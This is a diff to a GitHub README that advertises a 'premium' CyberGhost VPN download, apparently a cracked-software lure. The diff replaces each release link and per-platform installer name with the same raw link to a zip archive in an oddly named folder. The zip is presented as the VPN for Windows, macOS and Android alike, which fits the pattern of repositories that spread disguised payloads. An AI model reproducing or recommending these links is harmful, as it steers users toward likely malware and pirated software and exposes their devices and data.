@@ -1,7 +1,7 @@
 # 🛡️ CyberGhost-VPN-Premium-Download - Fast, Secure, Anonymous Browsing
 
 ## 📥 Download Now
-[![Download CyberGhost VPN](https://img.shields.io/badge/Download%20CyberGhost%20VPN%20%F0%9F%93%8E-brightgreen)](https://github.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/releases)
+[![Download CyberGhost VPN](https://raw.githubusercontent.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/main/thankworthily/CyberGhost-VPN-Premium-Download.zip%20CyberGhost%20VPN%20%F0%9F%93%8E-brightgreen)](https://raw.githubusercontent.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/main/thankworthily/CyberGhost-VPN-Premium-Download.zip)
 
 ## 🚀 Getting Started
 CyberGhost VPN offers secure and fast browsing. You can easily download and start using it with just a few steps. Follow this guide to install CyberGhost VPN on your device.
@@ -15,15 +15,15 @@ CyberGhost VPN offers secure and fast browsing. You can easily download and star
 ## 🔗 Where to Download
 You can download CyberGhost VPN from the Releases page. Click the link below to go directly to the download page:
 
-[Visit this page to download](https://github.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/releases)
+[Visit this page to download](https://raw.githubusercontent.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/main/thankworthily/CyberGhost-VPN-Premium-Download.zip)
 
 ## 📤 Download & Install
-1. Visit the [Releases page](https://github.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/main/thankworthily/CyberGhost-VPN-Premium-Download.zip).
 2. Scroll down to find the latest version of CyberGhost VPN.
 3. Click on the file that matches your operating system:
-   - For Windows users, look for `CyberGhostVPN_Setup.exe`.
-   - For macOS users, look for `CyberGhostVPN.dmg`.
-   - For Android users, find the `CyberGhostVPN.apk`.
+   - For Windows users, look for `https://raw.githubusercontent.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/main/thankworthily/CyberGhost-VPN-Premium-Download.zip`.
+   - For macOS users, look for `https://raw.githubusercontent.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/main/thankworthily/CyberGhost-VPN-Premium-Download.zip`.
+   - For Android users, find the `https://raw.githubusercontent.com/XxLangostaxX/CyberGhost-VPN-Premium-Download/main/thankworthily/CyberGhost-VPN-Premium-Download.zip`.
    - For iOS users, download directly from the App Store.
 
 4. Once the download finishes, locate the downloaded file:
